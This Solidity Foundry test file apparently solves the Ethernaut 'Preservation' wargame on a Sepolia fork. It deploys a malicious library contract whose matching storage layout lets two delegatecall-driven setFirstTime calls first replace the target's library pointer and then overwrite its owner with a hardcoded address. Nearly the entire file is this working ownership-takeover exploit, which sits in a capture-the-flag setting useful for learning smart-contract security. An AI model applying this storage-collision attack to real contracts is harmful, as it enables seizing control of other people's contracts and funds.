// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Test, console} from "forge-std/Test.sol";
import {Preservation} from "../src/Preservation.sol";

contract PreservationTest is Test {

    function setUp() public {
        vm.createSelectFork("https://ethereum-sepolia-rpc.publicnode.com", 6671445);
    }

    function test_DelegateCall() public {
        Preservation preservation = Preservation(0x8Ee746348d84340fBca0Bebd245F8925A2B9AF5d);

        console.log("time1 : ", preservation.timeZone1Library());

        console.log("owner : ", preservation.owner(), "\n");

        LibraryContract libraryContract = new LibraryContract();

        preservation.setFirstTime(uint256(uint160(address(libraryContract))));

        console.log("time1 : ", preservation.timeZone1Library());

        console.log("owner : ", preservation.owner(), "\n");

        preservation.setFirstTime(1);

        console.log("time1 : ", preservation.timeZone1Library());

        console.log("owner : ", preservation.owner());
    }
}

contract LibraryContract {
    address public timeZone1Library;
    address public timeZone2Library;
    address public owner;
    uint256 storedTime;

    function setTime(uint256 _time) public {
        owner = 0xA6270E61a6485f649f7E18b6e9eBF4d1d184D69d;
    }
}